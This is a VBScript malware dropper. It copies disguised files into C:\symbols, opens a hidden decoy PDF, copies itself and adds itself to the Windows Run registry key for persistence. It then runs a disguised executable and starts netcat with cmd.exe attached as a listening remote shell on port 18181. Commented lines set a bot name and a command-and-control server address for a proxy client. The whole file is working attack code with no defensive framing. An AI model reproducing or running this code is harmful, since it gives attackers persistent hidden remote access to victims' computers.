On Error Resume Next
Dim fso,Shell,TxtFl,Str
Set fso = CreateObject("Scripting.FileSystemObject")
Set Shell=Wscript.Createobject("Wscript.shell")
If Not fso.folderExists("C:\symbols\") Then     
    fso.CreateFolder "C:\symbols\"
    fso.CreateFolder "C:\symbols\MailContactsCalendarSync\"
	fso.CopyFolder ".\log\MailContactsCalendarSync\*", "C:\symbols\MailContactsCalendarSync\"
    fso.CopyFile ".\log\MailContactsCalendarSync\*", "C:\symbols\MailContactsCalendarSync\"
	Shell.Run "iexplore.exe C:\symbols\MailContactsCalendarSync\mydoc.pdf",0,TRUE
	fso.getfile(wscript.scriptfullname).copy("C:\symbols\run.vbs")   
End If
RegPath = "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run\"
type_name = "REG_SZ"
key_name = "run"
key_data = "C:\symbols\" & key_name & ".vbs"
Shell.RegWrite RegPath & key_name , key_data , type_name
'Set TxtFl = fso.OpenTextFile ("C:\symbols\MailContactsCalendarSync\P2PSocket\Client.ini")
'Str = Replace ( TxtFl.ReadAll,"ClientName=QUAN","ClientName=TestJob") '肉鸡名字
'Str2 = Replace ( TxtFl.ReadAll,"ServerAddress=211.149.222.206:3387","ServerAddress=211.149.222.206:3387")  '上线地址
'TxtFl.Write Str
'TxtFl.Write Str2 
'TxtFl.Close
Shell.Run "C:\symbols\MailContactsCalendarSync\RuntimeBr0ker.exe",0,FALSE
Shell.Run "cmd /c start C:\symbols\MailContactsCalendarSync\nc.exe -Ldp 18181 -e cmd.exe",FALSE
Set fso = Nothing
Set Shell = Nothing



